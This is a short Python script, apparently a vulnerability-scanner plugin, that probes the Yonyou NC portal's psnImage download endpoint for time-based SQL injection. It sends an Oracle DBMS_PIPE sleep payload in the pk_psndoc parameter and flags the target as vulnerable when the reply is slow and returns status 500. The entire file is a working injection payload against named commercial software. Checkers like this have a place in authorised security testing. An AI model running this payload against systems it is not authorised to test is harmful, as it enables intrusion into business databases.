import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友NC接口download存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "/portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),8)%20AND%20(%27rASZ%27=%27rASZ")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 500 and response.elapsed.total_seconds() > 5:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult